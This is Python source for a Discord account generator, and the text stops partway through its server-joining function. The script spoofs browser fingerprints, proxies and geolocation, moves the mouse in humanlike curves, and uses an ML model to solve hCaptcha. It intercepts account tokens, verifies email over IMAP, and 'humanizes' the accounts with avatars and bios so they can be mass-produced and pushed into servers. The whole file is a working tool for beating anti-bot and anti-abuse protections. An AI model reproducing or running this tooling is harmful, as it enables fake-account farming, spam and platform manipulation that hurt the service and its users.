# PreInstalled PyPackages
import asyncio
import logging
import os
import random
import re
import time
import tempfile
import traceback
import json
import base64
import websocket
import sys

# Pip Install Packages
import numpy as np
import scipy.interpolate
import playwright_stealth
import requests
import imaplib
import email
from playwright.async_api import async_playwright
from random_user_agent.user_agent import UserAgent
from random_user_agent.params import SoftwareName, OperatingSystem
import discum
import validators

# Imports from Files
from hcaptcha_challenger import (DIR_CHALLENGE, DIR_MODEL, PATH_OBJECTS_YAML,
                                 ArmorCaptcha)
from hcaptcha_challenger.solutions.kernel import Solutions
from mailinfo import MailInfo


NAMES = requests.get(
    "https://raw.githubusercontent.com/itschasa/Discord-Scraped/main/names.txt").text.splitlines()
NAMES = [x for x in NAMES if len(x) >= 8]

PASSWORDS = requests.get(
    "https://raw.githubusercontent.com/berzerk0/Probable-Wordlists/master/Real-Passwords/WPA-Length/Top4800-WPA-probable-v2.txt").text.splitlines()
PASSWORDS = [x + "".join(random.choice(["1", "2", "3", "4", "5", "6", "7", "8", "9", "0"])
                         for _ in range(random.randint(1, 3))) + "".join(random.choice(["!", "$", "§", ".", ",", "(", ")", "/", "?", "%", "+", "*", "-", "_"])
                                                                         for _ in range(random.randint(2, 5))) for x in PASSWORDS if len(x) >= 8]


class Faker:
    def __init__(self, proxy):
        self.proxy = proxy
        return

    async def person(self):
        self.username = random.choice(NAMES)
        self.password = random.choice(PASSWORDS)
        self.birth_year = str(random.randint(1950, 2000))
        self.birth_month = str(random.randint(1, 12))
        self.birth_day = str(random.randint(1, 12))

    async def geolocation(self, country=""):
        url = f"https://api.3geonames.org/randomland.{country}.json"
        r = requests.get(url)
        data = r.json()["nearest"]
        self.latitude = data.get("latt")
        self.longitude = data.get("longt")
        self.city = data.get("city")
        self.country = data.get("prov")
        self.state = data.get("state")
        self.region = data.get("region")
        self.elevation = data.get("elevation")
        self.timezone = data.get("timezone")

    async def computer(self):
        try:
            # Sometimes the API is offline
            while True:
                url = "http://fingerprints.bablosoft.com/preview?rand=0.1&tags=Firefox,Desktop,Microsoft%20Windows"
                r = requests.get(url, proxies=self.proxy,
                                 timeout=20)
                data = r.json()
                self.useragent = data.get("ua")
                self.vendor = data.get("vendor")
                self.renderer = data.get("renderer")
                self.width = data.get("width")
                self.height = data.get("height")
                self.avail_width = data.get("availWidth")
                self.avail_height = data.get("availHeight")
                # If the Window is too small for the captcha
                if self.height > 810 and self.avail_height > 810:
                    return
        except Exception as e:
            # If Bablosoft Website is offline
            software_names = [SoftwareName.FIREFOX.value]
            operating_systems = [OperatingSystem.WINDOWS.value]
            user_agent_rotator = UserAgent(
                software_names=software_names, operating_systems=operating_systems, limit=1)
            self.useragent = user_agent_rotator.get_random_user_agent()
            self.vendor = "Google Inc."
            self.renderer = "Google Inc. (AMD)"
            self.width = 1280
            self.height = 720
            self.avail_width = 1280
            self.avail_height = 720

    # Shit Method To Get Locale of Country code
    async def locale(self, country_code="US"):
        url = f"https://restcountries.com/v3.1/alpha/{country_code}"
        r = requests.get(url)
        data = r.json()[0]
        self.languages = data.get("languages")
        self.language_code = list(self.languages.keys())[0][:2]
        self.locale = f"{self.language_code.lower()}-{country_code.upper()}"


class Proxy:
    def __init__(self, proxy):
        self.proxy = proxy.strip() if proxy else None
        self.http_proxy = None
        self.ip = None
        self.port = None
        self.username = None
        self.password = None

        if self.proxy:
            self.split_proxy()
            self.proxy = f"{self.username}:{self.password}@{self.ip}:{self.port}" if self.username else f"{self.ip}:{self.port}"
            self.http_proxy = f"http://{self.proxy}"
        self.httpx_proxy = {"http": self.http_proxy,
                            "https": self.http_proxy} if self.proxy else None

        self.check, self.reason = self.check_proxy()

    def split_helper(self, splitted):
        if not any([_.isdigit() for _ in splitted]):
            raise GeneratorExit("No ProxyPort could be detected")
        if splitted[1].isdigit():
            self.ip, self.port, self.username, self.password = splitted
        elif splitted[3].isdigit():
            self.username, self.password, self.ip, self.port = splitted
        else:
            raise GeneratorExit(f"Proxy Format ({self.proxy}) isnt supported")

    def split_proxy(self):
        splitted = self.proxy.split(":")
        if len(splitted) == 2:
            self.ip, self.port = splitted
        elif len(splitted) == 3:
            if "@" in self.proxy:
                helper = [_.split(":") for _ in self.proxy.split("@")]
                splitted = [x for y in helper for x in y]
                self.split_helper(splitted)
            else:
                raise GeneratorExit(
                    f"Proxy Format ({self.proxy}) isnt supported")
        elif len(splitted) == 4:
            self.split_helper(splitted)
        else:
            raise GeneratorExit(f"Proxy Format ({self.proxy}) isnt supported")

    def check_proxy(self):
        try:
            ip_request = requests.get('https://jsonip.com',
                                      proxies=self.httpx_proxy)
            ip = ip_request.json().get("ip")
            r = requests.get(f"http://ip-api.com/json/{ip}")
            data = r.json()
            self.country = data.get("country")
            self.country_code = data.get("countryCode")
            self.region = data.get("regionName")
            self.city = data.get("city")
            self.zip = data.get("zip")
            self.latitude = data.get("lat")
            self.longitude = data.get("lon")
            self.timezone = data.get("timezone")

            if not self.country:
                return False, "Could not get GeoInformation from proxy (Proxy is Invalid/Failed Check)"
            return True, "placeholder"
        except:
            return False, "Could not get GeoInformation from proxy (Proxy is Invalid/Failed Check)"


class Generator:
    async def initialize(self, proxy, mode=None, output_file="output.txt", email=True, humanize=True, output_format="token:email:pass", invite_link=""):
        # Initializing the Thread
        self.last_x, self.last_y = 0, 0
        self.proxy, self.mode, self.output_file, self.output_format = proxy, mode, output_file, output_format
        self.email_verification, self.humanize, self.invite_link = email, humanize, invite_link
        self.token, self.email, self.output = "", "", ""
        # SettingUp Logger
        logging.basicConfig(
            format='\033[34m[%(levelname)s] - \033[94mLine %(lineno)s  - \033[36m%(funcName)s() - \033[96m%(message)s\033[0m')
        self.logger = logging.getLogger('logger')
        self.logger.setLevel(logging.DEBUG)
        # Initializing Faker, ComputerInfo, PersonInfo and ProxyInfo
        self.proxy = Proxy(self.proxy)
        if not self.proxy.check:
            self.logger.error(f"Proxy Check Failed: {self.proxy.reason}")
            return False

        self.faker = Faker(self.proxy.httpx_proxy)

        await self.faker.computer()
        await self.faker.person()
        await self.faker.locale(self.proxy.country_code)

        # Initializing LocaleInfo and Browser
        await self.initialize_browser()
        self.logger.info("Spawned Browser successfully")

        if mode == 1:
            await self.generate_unclaimed()
        elif mode == 2:
            await self.generate_token()
        elif mode == 3:
            await self.check_captcha()
        return

    async def initialize_browser(self):
        # Browser Proxy Formatter
        if self.proxy.proxy:
            if self.proxy.username:
                self.browser_proxy = {
                    "server": f"http://{self.proxy.ip}:{self.proxy.port}", "username": self.proxy.username, "password": self.proxy.password}
            else:
                self.browser_proxy = {
                    "server": f"http://{self.proxy.ip}:{self.proxy.port}"}
        else:
            self.browser_proxy = None
        # Starting Playwright
        self.playwright = await async_playwright().start()
        # Launching Firefox with Human Emulation
        main_browser = await self.playwright.firefox.launch(args=["incognito"], headless=False, proxy=self.browser_proxy if self.proxy else None)
        # Context for more options
        browser = await main_browser.new_context(
            locale="en-US",  # self.faker.locale
            geolocation={'longitude': self.proxy.longitude,
                         'latitude': self.proxy.latitude, "accuracy": 0.7},
            timezone_id=self.proxy.timezone,
            permissions=['geolocation'],
            screen={"width": self.faker.avail_width,
                    "height": self.faker.avail_height},
            user_agent=self.faker.useragent,
            viewport={"width": self.faker.width,
                      "height": self.faker.height},
            proxy=self.browser_proxy,
            http_credentials={
                "username": self.proxy.username, "password": self.proxy.password} if self.proxy.username else None
        )
        # Grant Permissions to Discord to use Geolocation
        await browser.grant_permissions(["geolocation"], origin="https://discord.com")
        # Create new Page and do something idk why i did that lol
        page = await browser.new_page()
        await page.emulate_media(color_scheme="dark", media="screen", reduced_motion="reduce")
        # Stealthen the page with custom Stealth Config
        config = playwright_stealth.StealthConfig()
        config.navigator_languages, config.permissions, config.navigator_platform, config.navigator_vendor, config.outerdimensions = False, False, False, False, False
        config.vendor, config.renderer, config.nav_user_agent, config.nav_platform = self.faker.vendor, self.faker.renderer, self.faker.useragent, "Win32"
        config.languages = ('en-US', 'en', self.faker.locale,
                            self.faker.language_code)
        await playwright_stealth.stealth_async(page, config)
        self.browser, self.page = browser, page

    async def close(self):
        try:
            await self.page.close()
        except:
            pass
        try:
            await self.browser.close()
        except:
            pass
        try:
            await self.playwright.stop()
        except:
            pass

    def log_output(self):
        output = ""
        for item in self.output_format.split(":"):
            if "token" in item and self.token:
                output += self.token + ":"
            if "email" in item and self.email:
                output += self.email + ":"
            if "pass" in item:
                output += self.faker.password + ":"
            if "proxy" in item and self.proxy:
                output += self.proxy + ":"

        # Remove last :
        output = output[:-1]
        self.output = output

    async def type_humanly(self, locator, text):
        # Get the Element by Selector and click it
        element = self.page.locator(locator)
        await self.click_humanly(element, "")
        # Wait some random time and
        await self.page.wait_for_timeout(random.randint(2, 4)*100)
        await element.type(text, delay=random.randint(150, 250))
        await self.page.wait_for_timeout(random.randint(4, 8)*100)

    async def click_xy_humanly(self, x, y):
        # Move mouse humanly to the Coordinates and wait some random time
        await self.humanize_mouse_movement(x, y)
        await self.page.wait_for_timeout(random.randint(4, 8)*100)
        # Click the Coordinates and wait some random time
        await self.page.mouse.click(x, y, delay=random.randint(40, 100))
        await self.page.wait_for_timeout(random.randint(4, 8)*100)

    async def click_humanly(self, element="", locator="", timeout=30000):
        # Getting Element by Selector if Element isnt passed
        if not element:
            element = self.page.locator(locator)
        # Get a random coordinate inside the element
        coordinates = await element.bounding_box(timeout=timeout)
        x, y = coordinates["x"] + \
            random.randint(10, 20), coordinates["y"] + random.randint(10, 20)
        # Click the Coordinates and return them
        await self.click_xy_humanly(x, y)
        return x, y

    async def humanize_mouse_movement(self, x, y):
        xp, yp = [x, self.last_x], [y, self.last_y]

        def midpoints(xp, yp):
            new_x, new_y = xp[:], yp[:]
            for x, y in zip(xp, yp):
                last_x, last_y = xp[-1], yp[-1]
                calc_x, calc_y = ((x + last_x)/2, (y + last_y)/2)
                if calc_x not in new_x and calc_y not in new_y:
                    new_x.append(calc_x)
                    new_y.append(calc_y)
            return new_x, new_y

        for i in range(5):
            xp, yp = midpoints(xp, yp)

        # Every item but the first and last one
        xp, yp = sorted(xp), sorted(yp)
        nxp, nyp = xp[1:-1], yp[1:-1]
        # Randomize points
        sxp, syp = [], []
        for x, y in zip(nxp, nyp):
            sxp.append(random.uniform(x-0.4, x+0.4))
            syp.append(random.uniform(y-0.4, y+0.4))
        # Combine First, Last Point and new random points
        xp = [*sxp, xp[-1]]
        yp = [*syp, yp[-1]]
        # Move Mouse to new random locations
        for x, y in zip(xp, yp):
            await self.page.mouse.move(x, y)
            await self.page.wait_for_timeout(random.randint(20, 60))
        # Set LastX and LastY cause Playwright doesnt have mouse.current_location
        self.last_x, self.last_y = xp[-1], yp[-1]

    def smooth_out_mouse(self):
        # Get the Captcha X- and Y-Coordinates
        self.x_coordinates, self.y_coordinates = [
            _[0] for _ in self.captcha_points], [_[1] for _ in self.captcha_points]
        # Fixxing https://github.com/Vinyzu/DiscordGenerator/issues/3 by adding an extra point
        # (Its two points for real basicly you click an correct image two times again)
        if len(self.x_coordinates) <= 2:
            random_index = random.choice(range(len(self.x_coordinates)))
            x1, x2 = self.x_coordinates[random_index] + \
                1, self.x_coordinates[random_index] - 1
            self.x_coordinates.extend([x1, x2])
            y1, y2 = self.y_coordinates[random_index] + \
                1, self.y_coordinates[random_index] - 1
            self.y_coordinates.extend([y1, y2])
        # Devide x and y coordinates into two arrays
        x, y = np.array(self.x_coordinates), np.array(self.y_coordinates)
        # i dont even know, copy pasted from this so https://stackoverflow.com/a/47361677/16523207
        x_new = np.linspace(x.min(), x.max(), 200)
        f = scipy.interpolate.interp1d(x, y, kind='quadratic')
        y_new = f(x_new)
        # Converting NpArrays to lists
        y_new = y_new.tolist()
        x_new = x_new.tolist()
        # Randomize Points to emulate human mouse wobblyness
        x_new = [random.uniform(
            x-random.randint(5, 20)/10, x+random.randint(5, 20)/10) for x in x_new]
        y_new = [random.uniform(
            y-random.randint(5, 20)/10, y+random.randint(5, 20)/10) for y in y_new]

        return x_new, y_new

    async def log_captcha(self):
        async def check_json(route, request):
            await route.continue_()
            try:
                response = await request.response()
                await response.finished()
                json = await response.json()
                if json.get("generated_pass_UUID"):
                    self.captcha_token = json.get("generated_pass_UUID")
            except Exception:
                pass

        await self.page.route("https://hcaptcha.com/checkcaptcha/**", check_json)

    async def captcha_module(self):
        # Getting first 9 of the logged Images (First nine are the CaptchaImages)
        for image_url in self.images[:9]:
            # Getting Content of Image
            data = requests.get(image_url).content
            # Getting Result from AI and appending it to list
            try:
                result = self.model.solution(
                    img_stream=data, label=self.challenger.label_alias[self.label])
            except KeyError as e:
                self.logger.error(f"AI doesnt support {self.label} yet!")
                self.images = []
                await self.click_humanly(self.checkbox, "")
                await self.page.wait_for_timeout(2000)
                await self.click_humanly(self.checkbox, "")
                await self.captcha_solver()
                return
            self.results.append(result)

    async def captcha_solver(self):
        # Setup CaptchaToken Logger
        self.captcha_token = None
        await self.log_captcha()
        # Second Frame is Captcha Frame (With Captcha Images)
        # captcha_frame = self.page.frames[1]
        try:
            captcha_frames = self.page.frame_locator(
                "//iframe[contains(@title,'content')]")
            captcha_frame = captcha_frames.first
        except Exception as e:
            self.logger.debug(f"Captcha Exception: {str(e)}")
            self.logger.info("Captcha Passed successfully!")
            return True
        # Getting Question and Label of the Captcha
        try:
            question_locator = captcha_frame.locator(
                "//h2[@class='prompt-text']")
            question = await question_locator.text_content()
        except Exception as e:
            print(e)
            self.logger.error("Captcha Question didnt load")
            await self.close()
            return False
        self.label = re.split(
            r"containing a", question)[-1][1:].strip() if "containing" in question else question
        self.label = self.label.replace(".", "")
        self.logger.info(f"Got Captcha QuestionLabel: {self.label}")
        # Initializing ArmorCaptcha
        self.challenger = ArmorCaptcha(dir_workspace=DIR_CHALLENGE, dir_model=DIR_MODEL, lang='en', debug=True,
                                       path_objects_yaml=PATH_OBJECTS_YAML, onnx_prefix="yolov5s6")
        # Getting Lavel and Model from AI
        self.challenger.label = self.label
        self.model = self.challenger.switch_solution()  # DIR_MODEL, None
        # Solving Captcha with AI
        self.results, timee = [], time.perf_counter()
        for i in range(3):
            await self.captcha_module()
            if not any(self.results):
                self.logger.warning(
                    "AI Results were incorrect, retrying AI")
                pass
            else:
                break
        # If Results are Invalid Reload Captcha and Recurse
        else:
            self.logger.warning("AI Results were incorrect, redoing Captcha")
            self.images = []
            await self.click_humanly(self.checkbox, "")
            await self.page.wait_for_timeout(2000)
            await self.click_humanly(self.checkbox, "")
            await self.captcha_solver()
            return

        self.logger.info(
            f"AI-Results (solved in {round(time.perf_counter() - timee, 5)}s): {self.results}")
        # More Realistic Human Behaviour
        await self.page.wait_for_timeout(6000)
        # Get All of the Images
        image_locator = captcha_frame.locator("//div[@class='task-image']")
        self.image_elements = await image_locator.element_handles()
        # Define Captcha Points and Used Captha points
        self.captcha_points, self.used_captcha_points = [], []
        # Getting Random Coordinate from Image if Image is Correct
        for result, element in zip(self.results, self.image_elements):
            if result:
                # Getting X,Y, Width and Height of Captcha Image if its True/Valid
                boundings = await element.bounding_box()
                x, y, width, height = boundings.values()
                # Clicking on random Location in the Picture for better MotionData
                while True:
                    random_x, random_y = random.randint(int(x), int(
                        x + width)), random.randint(int(y), int(y + height))
                    if random_x not in [_[0] for _ in self.captcha_points]:
                        self.captcha_points.append([random_x, random_y])
                        break

        self.logger.debug(self.captcha_points)
        if not self.captcha_points:
            # Ignore
            return False
        # Get Coodinates of Smooth out mouse line
        self.x_new, self.y_new = self.smooth_out_mouse()
        # Method to insert the Original Captcha Points into the Curve Points
        self.zipped_rounded_points = [list(a) for a in zip(
            [int(x) for x in self.x_new], [int(y) for y in self.y_new])]
        for point in self.captcha_points:
            # Check if Point is not in the Curve Points
            if point not in self.zipped_rounded_points:
                best_index, best_difference = 0, 1000
                for i, difference_point in enumerate(self.zipped_rounded_points):
                    # Check Difference between Point and DifferencePoint
                    x_difference = point[0] - difference_point[0]
                    y_difference = point[1] - difference_point[1]
                    # Make Negative Number Positive with the Abs() Function
                    difference = abs(x_difference) + abs(y_difference)
                    # Check if DifferencePoint is newest to given Point
                    if difference < best_difference:
                        best_index, best_difference = i, difference
                # Insert the Point at the best calculated Point
                self.x_new.insert(best_index+1, point[0])
                self.y_new.insert(best_index+1, point[1])

        for x, y in zip(self.x_new, self.y_new):
            x, y = int(x), int(y)
            # Check if coordinate is in the captcha_point (If yes, click it)
            # Also Check if the captcha was already clicked
            if any(x == int(_) for _ in self.x_coordinates) and x not in self.used_captcha_points:
                await self.page.mouse.move(x, y)
                await self.page.wait_for_timeout(random.randint(100, 300))
                await self.page.mouse.click(x, y, delay=random.randint(40, 100))
                # Append Coordinat to Used Captcha Points
                self.used_captcha_points.append(x)
                await self.page.wait_for_timeout(random.randint(5, 20))
            else:
                await self.page.mouse.move(x, y)
                await self.page.wait_for_timeout(random.randint(5, 20))

        await self.page.wait_for_timeout(600)
        # Clicking Submit Button
        submit_button = captcha_frame.locator(
            "//div[@class='button-submit button']").first
        await self.click_humanly(submit_button, "")
        # Checking if Captcha was Bypassed
        for _ in range(100):
            if self.captcha_token:
                censored_token = f"{self.captcha_token.split('.')[0]}.{self.captcha_token.split('.')[1][:10]}*****"
                self.logger.info(
                    f"Bypassed Captcha Successfully: {censored_token}")
                return True
            else:
                await self.page.wait_for_timeout(100)

        # If Captcha Token wasnt fetched redo Captcha
        self.logger.warning(
            "Captcha Solution was Incorrect or another is needed")
        self.images = []
        await self.click_humanly(self.checkbox, "")
        await self.page.wait_for_timeout(2000)
        await self.click_humanly(self.checkbox, "")
        await self.captcha_solver()

    # Main Functions
    async def check_captcha(self):
        try:
            await self.page.goto("https://democaptcha.com/demo-form-eng/hcaptcha.html")
        except:
            self.logger.error("Site didn´t load")
            return False
        # Collecting all Images requested from hCaptcha (Captcha Images)
        self.images = []

        async def image_append(route, request):
            if request.resource_type == "image" and "hcaptcha" in request.url:
                self.images.append(request.url)
            await route.continue_()
        await self.page.route("https://imgs.hcaptcha.com/*", image_append)
        # Clicking Captcha Checkbox
        try:
            self.checkbox = self.page.frame_locator(
                '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
            await self.checkbox.scroll_into_view_if_needed(timeout=20000)
        except Exception as e:
            self.logger.error("Captcha didn´t load")
            return False
        await self.click_humanly(self.checkbox, "")
        await self.page.wait_for_timeout(2000)
        captcha = await self.captcha_solver()

        await self.close()

    async def generate_unclaimed(self):
        try:
            # Going on Discord Register Site
            try:
                await self.page.goto("https://discord.com/")
            except:
                self.logger.error("Site didn´t load")
                await self.close()
                return False
            # Setting Up TokenLog
            await self.log_token()
            self.token = None
            # Click Open InBrowser Button
            await self.click_humanly("", '[class *= "gtm-click-class-open-button"]')
            # Typing Username
            await self.type_humanly('[class *= "username"]', self.faker.username)
            # Clicking Tos and Submit Button
            try:
                await self.click_humanly("", "[class *='termsCheckbox']", timeout=10000)
            except Exception as e:
                self.logger.debug("No TOS Checkbox was detected")
                pass
            await self.click_humanly("", '[class *= "gtm-click-class-register-button"]')
            # Collecting all Images requested from hCaptcha (Captcha Images)
            self.images = []

            async def image_append(route, request):
                if request.resource_type == "image" and "hcaptcha" in request.url:
                    self.images.append(request.url)
                await route.continue_()
            await self.page.route("https://imgs.hcaptcha.com/*", image_append)
            # Clicking Captcha Checkbox
            try:
                self.checkbox = self.page.frame_locator(
                    '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
                await self.checkbox.scroll_into_view_if_needed(timeout=20000)
            except:
                self.logger.error("Captcha didn´t load")
                await self.close()
                return False
            await self.click_humanly(self.checkbox, "")
            await self.page.wait_for_timeout(2000)
            captcha = await self.captcha_solver()

            while not self.token:
                await self.page.wait_for_timeout(2000)

            self.logger.info(f"Generated Token: {self.token}")
            await asyncio.sleep(2)

            is_locked = await self.is_locked()
            if is_locked:
                self.logger.error(f"Token {self.token} is locked!")
                await self.close()
                return
            else:
                self.logger.info(
                    f"Token: {self.token} is unlocked! Flags: {self.flags}")

            self.log_output()

            await self.page.wait_for_timeout(3000)
            try:
                await self.type_humanly('[id="react-select-2-input"]', self.faker.birth_day)
                await self.page.keyboard.press("Enter")
                await self.type_humanly('[id="react-select-3-input"]', self.faker.birth_month)
                await self.page.keyboard.press("Enter")
                await self.type_humanly('[id="react-select-4-input"]', self.faker.birth_year)
                await self.page.keyboard.press("Enter")
                await self.page.wait_for_timeout(1000)
                await self.page.keyboard.press("Enter")
            except:
                pass

            self.bot = discum.Client(
                token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)

            if self.email_verification:
                self.logger.info("Claiming Account...")
                claim = await self.claim_account()

                if claim:
                    self.logger.info("Verifying email...")
                    email_v = await self.confirm_email()

                    self.bot.switchAccount(self.token)

            self.log_output()

            if self.humanize:
                await self.humanize_token()

            if self.invite_link:
                await self.join_server()

            self.log_output()
            with open(self.output_file, 'a') as file:
                file.write(f"{self.output}\n")

            self.logger.info(
                "Successfully Generated Account! Closing Browser...")

            await self.close()

        # Catch Exceptions and save output anyways
        except:
            self.logger.error(
                "Catched Exception, trying to save Token anyways... \n Error:")
            print("\033[96m" + traceback.format_exc() + "\033[0m")
            if self.output:
                with open(self.output_file, 'a') as file:
                    file.write(f"{self.output}\n")

    async def generate_token(self):
        try:
            # Going on Discord Register Site
            try:
                await self.page.goto("https://discord.com/register")
            except:
                self.logger.error("Site didn´t load")
                await self.close()
                return False
            # Setting Up TokenLog
            await self.log_token()
            self.token = None
            # Typing Email, Username, Password
            self.inbox = MailInfo.generateInbox(rush=True)
            self.email = self.inbox.address if self.email_verification else str(self.faker.username+f"{random.randint(10, 99)}@gmail.com")
            await self.type_humanly('[name="email"]', self.email)
            await self.type_humanly('[name="username"]', self.faker.username)
            await self.type_humanly('[name="password"]', self.faker.password)
            # Typing BirthDay, BirthMonth, BirthYear
            await self.type_humanly('[id="react-select-2-input"]', self.faker.birth_day)
            await self.page.keyboard.press("Enter")
            await self.type_humanly('[id="react-select-3-input"]', self.faker.birth_month)
            await self.page.keyboard.press("Enter")
            await self.type_humanly('[id="react-select-4-input"]', self.faker.birth_year)
            # Clicking Tos and Submit Button
            try:
                tos_box = self.page.locator("[type='checkbox']").first
                await self.click_humanly(tos_box, "")
            except Exception as e:
                self.logger.debug("No TOS Checkbox was detected")
                pass
            await self.click_humanly("", '[type="submit"]')
            # Collecting all Images requested from hCaptcha (Captcha Images)
            self.images = []

            async def image_append(route, request):
                if request.resource_type == "image" and "hcaptcha" in request.url:
                    self.images.append(request.url)
                await route.continue_()
            await self.page.route("https://imgs.hcaptcha.com/*", image_append)
            # Clicking Captcha Checkbox
            try:
                self.checkbox = self.page.frame_locator(
                    '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
                await self.checkbox.scroll_into_view_if_needed(timeout=20000)
            except Exception as e:
                print(str(e))
                self.logger.error("Captcha didn´t load")
                await self.close()
                return False
            await self.click_humanly(self.checkbox, "")
            await self.page.wait_for_timeout(2000)
            captcha = await self.captcha_solver()

            while not self.token:
                await self.page.wait_for_timeout(2000)

            self.logger.info(f"Generated Token: {self.token}")
            await self.page.wait_for_timeout(2000)

            is_locked = await self.is_locked()
            if is_locked:
                self.logger.error(f"Token {self.token} is locked!")
                await self.close()
                return
            else:
                self.logger.info(
                    f"Token: {self.token} is unlocked! Flags: {self.flags}")

            self.log_output()

            self.bot = discum.Client(
                token=self.token, log=False, user_agent=self.faker.useragent, proxy=self.proxy.http_proxy if self.proxy.proxy else None)

            if self.email_verification:
                self.logger.info("Verifying email...")
                email_v = await self.confirm_email()

                self.bot.switchAccount(self.token)

            self.log_output()

            if self.humanize:
                await self.humanize_token()

            if self.invite_link:
                await self.join_server()

            self.log_output()
            with open(self.output_file, 'a') as file:
                file.write(f"{self.output}\n")

            self.logger.info(
                "Successfully Generated Account! Closing Browser...")

            await self.close()

        # Catch Exceptions and save output anyways
        except:
            self.logger.error(
                "Catched Exception, trying to save Token anyways... \n Error:")
            print("\033[96m" + traceback.format_exc() + "\033[0m")
            if self.output:
                with open(self.output_file, 'a') as file:
                    file.write(f"{self.output}\n")

    # Discord Helper Functions
    async def log_token(self):
        async def check_json(route, request):
            await route.continue_()
            try:
                response = await request.response()
                await response.finished()
                json = await response.json()
                if json.get("token"):
                    self.token = json.get("token")
            except Exception:
                pass

        await self.page.route("https://discord.com/api/**", check_json)

    async def is_locked(self):
        token_check = requests.get('https://discord.com/api/v9/users/@me/library',
                                   headers={"Authorization": self.token}, proxies=self.proxy.httpx_proxy).status_code == 200
        if token_check:
            r = requests.get(
                'https://discord.com/api/v9/users/@me', headers={"Authorization": self.token}, proxies=self.proxy.httpx_proxy)
            response = r.json()
            self.id = response.get("id")
            self.email = response.get("email")
            self.username = response.get("username")
            self.discriminator = response.get("discriminator")
            self.tag = f"{self.username}#{self.discriminator}"
            self.flags = response.get("public_flags")

        return not token_check

    async def setAvatar(self, base_img):
        ws = websocket.WebSocket()
        ws.connect("wss://gateway.discord.gg/?v=6&encoding=json")

        auth = {"op": 2, "d": {"token": self.token, "properties": {
            "$os": sys.platform, "$browser": "RTB", "$device": f"{sys.platform} Device"}}, "s": None, "t": None}
        ws.send(json.dumps(auth))
        ws.send(json.dumps({"op": 1, "d": None}))

        headers = {"User-Agent": self.bot._Client__user_agent,
                   "Authorization": self.token,
                   "X-Context-Properties": "eyJsb2NhdGlvbiI6IlJlZ2lzdGVyIn0=",
                   "X-Debug-Options": "bugReporterEnabled",
                   "X-Discord-Locale": "en-US",
                   "X-Super-Properties": base64.b64encode(str(self.bot._Client__super_properties).encode('utf-8'))}

        cookies = requests.get(
            "https://discord.com/register").cookies.get_dict()
        data = {"avatar": f"data:image/jpg;base64,{base_img}"}

        r = requests.patch('https://discord.com/api/v9/users/@me',
                           json=data, headers=headers, cookies=cookies)
        print(r.json())
        return r.json().get("avatar")

    async def humanize_token(self):
        self.logger.info("Humanizing Token...")

        # Setting Random Avatar
        pics = requests.get(
            "https://api.github.com/repos/itschasa/Discord-Scraped/git/trees/cbd70ab66ea1099d31d333ab75e3682fd2a80cff")

        random_pic = random.choice(pics.json().get("tree")).get("path")
        pic_url = f"https://raw.githubusercontent.com/itschasa/Discord-Scraped/main/avatars/{random_pic}"
        pic = requests.get(pic_url).content

        base_img = base64.b64encode(pic).decode()
        avatar = await self.setAvatar(base_img)
        if not avatar:
            self.logger.warning("Couldnt set Avatar!")
        else:
            self.logger.info(f"Set Avatar {avatar} successfully!")

        # Setting AboutME
        try:
            quote = requests.get("https://free-quotes-api.herokuapp.com")
            quote = quote.json().get("quote")
        except:
            self.logger.warning(
                'Couldnt Get a Random Quote, Setting "Dislock" as AboutMe')
            quote = "Dislock"
        self.bot.setAboutMe(quote)

        # Setting Hypesquad
        hypesquad = random.choice(
            ["bravery", "brilliance", "balance"])
        self.bot.setHypesquad(hypesquad)

        self.logger.info(f"Set Hypesquad, Bio and ProfilePic!")

    async def claim_account(self):
        self.inbox = MailInfo.generateInbox(rush=True)
        self.email = self.inbox.address
        print(self.email)
        self.bot._Client__user_password = self.faker.password
        response = self.bot.setEmail(self.email)
        if not response.status_code == 200:
            try:
                self.logger.error(
                    f"Couldnt set email! Response: {response.json()}")
            except:
                self.logger.error(f"Couldnt set email!")
            return False
        else:
            self.logger.info("Successfully set email! Verifying...")
            try:
                if response.json().get("token"):
                    self.token = response.json().get("token")
            except:
                pass
            return True

    async def confirm_email(self):
        with open("config.json") as conf: config = json.load(conf)
        IMAPHOST, IMAPPORT = config["EMAIL STUFF"]["IMAP HOST"], config["EMAIL STUFF"]["IMAP PORT"]
        IMAPUSERNAME, IMAPPASSWORD = config["EMAIL STUFF"]["IMAP USERNAME"], config["EMAIL STUFF"]["IMAP APP PASSWORD"]
        before_token = self.token
        self.logger.info("Confirming Email...")
        self.VERIFICATIONLINK = None
        # Getting the email confirmation link from the email
        try:
            imap_server = imaplib.IMAP4_SSL(host=IMAPHOST, port=IMAPPORT)
            imap_server.login(IMAPUSERNAME, IMAPPASSWORD)
            imap_server.select()
            while self.VERIFICATIONLINK is None:
                await asyncio.sleep(2)
                _, message_number_raw = imap_server.search(None, "ALL")
                print(message_number_raw)
                message_number = message_number_raw[-1].split()[-1].decode("utf-8")
                _, msg = imap_server.fetch(message_number, "(RFC822)")
                raw_message = msg[0][1].decode("utf-8")
                email_message = email.message_from_string(raw_message)
                if email_message["from"] == "Discord <noreply@discord.com>":
                    for part in email_message.walk():
                        if part.get_content_type() == "text/plain":
                            body = part.get_payload(decode=True)
                            charset = part.get_content_charset("iso-8859-1")
                            chars = charset.encode(charset, "replace")
                            urls = re.findall('(?:(?:https?|ftp)://)?[\w/\-?=%.]+\.[\w/\-&?=%.]+', body.decode("latin1"))
                            if "https://click.discord.com/ls/click".encode() in body:
                                self.VERIFICATIONLINK = urls[0]
                                break      
            await self.page.goto(self.VERIFICATIONLINK)
            self.images = []
        except Exception: raise Exception
        
        async def image_append(route, request):
            if request.resource_type == "image" and "hcaptcha" in request.url:
                self.images.append(request.url)
            await route.continue_()
        await self.page.route("https://imgs.hcaptcha.com/*", image_append)
        # Clicking Captcha Checkbox
        try:
            self.checkbox = self.page.frame_locator(
                '[title *= "hCaptcha security challenge"]').locator('[id="checkbox"]')
            await self.checkbox.scroll_into_view_if_needed(timeout=10000)
        except:
            self.logger.info("No Email Captcha was detected!")
            return True
        await self.click_humanly(self.checkbox, "")
        await self.page.wait_for_timeout(2000)
        captcha = await self.captcha_solver()

        # Waiting until new token is set
        while self.token == before_token:
            await asyncio.sleep(2)
            if self.output: 
                with open(self.output_file, 'a') as file: file.write(f"{self.output}\n")
        self.logger.info("Email has been succesfully verified!")
        return True
        

    async def join_server(self):
        await self.page.goto("https://discord.com/channels/@me")
        await self.page.wait_for_timeout(1000)
        # Clicking Join Server Button
